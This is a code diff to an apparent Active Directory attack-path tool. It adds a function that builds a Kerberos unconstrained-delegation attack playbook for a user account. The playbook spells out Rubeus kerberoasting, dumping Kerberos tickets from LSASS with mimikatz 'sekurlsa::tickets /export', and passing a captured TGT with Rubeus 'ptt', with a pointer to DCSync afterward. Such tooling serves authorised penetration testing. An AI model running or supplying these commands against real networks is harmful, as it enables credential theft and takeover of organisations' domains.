@@ -52,6 +52,51 @@ def unconstrained_coerce(finding: DelegationFinding) -> list[dict]:
     ]
 
 
+def unconstrained_coerce_user(finding: DelegationFinding) -> list[dict]:
+    """Unconstrained delegation on a USER account: find service host, dump TGTs."""
+    target = finding.samaccountname
+
+    return [
+        {
+            "step": 1,
+            "title": f"Enumerate SPNs on {target} to find the service host",
+            "command": (
+                f"Rubeus.exe kerberoast /user:{target} /nowrap"
+            ),
+            "notes": [
+                f"Identifies which host runs {target}'s service.",
+                "The SPN hostname reveals the target machine.",
+            ],
+        },
+        {
+            "step": 2,
+            "title": "Dump tickets from the service host's LSASS",
+            "prereq": "Local admin on the service host (from SPN)",
+            "command": (
+                "mimikatz.exe \"privilege::debug\" "
+                "\"sekurlsa::tickets /export\""
+            ),
+            "notes": [
+                "Run on the HOST where the service account runs.",
+                "Look for TGTs from users who authenticated to the service.",
+                f"TGTs are in the service host's LSASS, NOT on {target} itself.",
+            ],
+        },
+        {
+            "step": 3,
+            "title": "Pass the captured ticket",
+            "prereq": "Exported .kirbi TGT from step 2",
+            "command": (
+                "Rubeus.exe ptt /ticket:<BASE64_TICKET>"
+            ),
+            "notes": [
+                "Injects the captured TGT into the current session.",
+                "Then use standard tools (mimikatz DCSync, etc.) with the injected ticket.",
+            ],
+        },
+    ]
+
+
 def constrained_t2a4d(finding: DelegationFinding) -> list[dict]:
     """Constrained delegation with T2A4D: Rubeus S4U."""
     domain = finding.domain.lower()
@@ -202,6 +247,7 @@ def tgtdeleg(finding: DelegationFinding) -> list[dict]:
 
 RUBEUS_COMMANDS = {
     "unconstrained_coerce": unconstrained_coerce,
+    "unconstrained_coerce_user": unconstrained_coerce_user,
     "constrained_t2a4d": constrained_t2a4d,
     "constrained_no_t2a4d": constrained_no_t2a4d,
     "rbcd_existing": rbcd_existing,
